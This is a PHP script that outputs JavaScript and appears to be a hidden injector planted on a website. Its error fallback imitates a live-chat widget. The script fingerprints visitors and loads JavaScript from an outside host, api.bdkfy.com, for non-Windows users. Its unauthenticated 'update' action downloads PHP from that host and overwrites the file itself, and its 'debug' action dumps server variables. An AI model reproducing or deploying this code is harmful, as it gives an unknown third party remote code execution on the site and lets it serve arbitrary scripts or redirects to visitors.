<?php
function getRemoteAddr(){
    if (isset($_SERVER['HTTP_CLIENT_IP'])){
        $arr = explode(',', $_SERVER['HTTP_CLIENT_IP']);
        return trim($arr[0]);
    }
    else if(isset($_SERVER['HTTP_X_FORWARDED_FOR'])){
        $arr = explode(',', $_SERVER['HTTP_X_FORWARDED_FOR']);
        return trim($arr[0]);
    }
    else if(isset($_SERVER["REMOTE_ADDR"])){
        return $_SERVER["REMOTE_ADDR"];
    }
    return '0.0.0.0';
}

function getAgent(){
	return isset($_SERVER['HTTP_USER_AGENT']) ? $_SERVER['HTTP_USER_AGENT'] : '';
}

function getRef(){
	return isset($_SERVER['HTTP_REFERER']) ? $_SERVER['HTTP_REFERER'] : '';
}

function request($url){
	if(function_exists('curl_init')){
		$curl = curl_init();
        curl_setopt($curl, CURLOPT_URL, $url);
        curl_setopt($curl, CURLOPT_RETURNTRANSFER, true);
        if (ini_get('open_basedir') == '' && ini_get('safe_mode' == 'Off')) {
			curl_setopt($curl, CURLOPT_FOLLOWLOCATION, 1);
		}
        curl_setopt($curl, CURLOPT_TIMEOUT, 5);
        curl_setopt($curl, CURLOPT_USERAGENT, getAgent());
        curl_setopt($curl, CURLOPT_REFERER, getRef());
        $text = curl_exec($curl);
       	if(curl_errno($curl)){
       		exit('/*can not connect server*/');
       	}
       	curl_close($curl);
       	return $text;
	}
	else{
		exit('/*Curl library is not open*/');
	}
}

function displayError(){
	echo 'if(typeof(openZoosUrl1) == "undefined"){
	window.openZoosUrl1 = function(){
		if(typeof(LR_url) == "string"){
			if(typeof(LR_sid) == "string"){
				if(typeof(LR_cid) == "string"){
					window.location.href = LR_url+"?sid="+LR_sid+"&cid="+LR_cid;
				}
			}
		}
	}
}';
	exit;
}

function getSelf(){
	$http = isset($_SERVER['REQUEST_SCHEME']) ? $_SERVER['REQUEST_SCHEME'] : 'http';
	$host = isset($_SERVER['HTTP_HOST']) ? $_SERVER['HTTP_HOST'] : '';
	$host = empty($host) ? '' : $http.'://'.$host;
	if(isset($_SERVER['SCRIPT_NAME'])){
		$script = $_SERVER['SCRIPT_NAME'];
	}
	else if(isset($_SERVER['PHP_SELF'])){
		$script = $_SERVER['PHP_SELF'];
	}
	else{
		$script = $_SERVER['REQUEST_URI'];
	}

	return $host.$script;
}

header('content-type:application/x-javascript; charset=utf8');
$actions  = array('init', 'next', 'do', 'update', 'debug');
$action   = isset($_GET['action']) && in_array($_GET['action'], $actions) ? $_GET['action'] : 'init';
$uid      = 'b20e0320111c';
$ip       = getRemoteAddr();
$api      = 'http://api.bdkfy.com';
$selfPath = getSelf();
$version  = 0.2;
if($action == 'init'){
	$url  = "{$api}/api/get/sign/id/{$uid}?sign={$ip}";
	$result = json_decode(request($url), true);
	if(isset($result['success']) && $result['success']){
		$time = time();
		$sign = md5($uid.$time.$ip.getAgent());
		$next = $selfPath.'?action=next&s='.$sign.'&t='.$time;
		echo '(function(){var url="'.$next.'&n="+encodeURIComponent(navigator.platform.toLocaleLowerCase()=="win32" ? 0 : 1);(document.getElementsByTagName("script")[0].parentNode).appendChild((function(){var s=document.createElement("script");s.setAttribute("src", url);return s})())})();';
	}
	else{
		displayError();
	}
}

else if($action == 'next'){
	if(isset($_GET['s'], $_GET['t'], $_GET['n'])){
		if($_GET['s'] == md5($uid.$_GET['t'].$ip.getAgent())){
			if(time() - $_GET['t'] < 10){
				if($_GET['n'] == '1'){
					$result = request("{$api}/api/get/newcheck?id={$uid}");
					echo str_replace('[[url]]', $selfPath.'?action=do', $result);
					exit;
				}
			}
		}
	}
	displayError();
}

else if($action == 'do'){
	$query = '';
	if(isset($_SERVER['QUERY_STRING'])){
		$query = $_SERVER['QUERY_STRING'];
	}
	else if(isset($_SERVER['REQUEST_URI'])){
		$paths =parse_url($_SERVER['REQUEST_URI']);
		if(isset($paths['query'])){
			$query = $paths['query'];
		}
	}
	$url = "{$api}/api/get/do/id/{$uid}?ip={$ip}&{$query}";
	echo request($url);
}

else if($action == 'update'){
	$url = "{$api}/api/get/version";
	$serVersion = request($url);
	if($serVersion > $version){
		$code = @file_get_contents("{$api}/api/get/phpcode/id/{$uid}");
		if($code){
			@file_put_contents(__FILE__, $code);
		}
	}
}

else if($action == 'debug'){
	
	echo 'Version:'.$version."<br/>";
	echo $uid."<br/>";
	print_r($_SERVER);
}
?>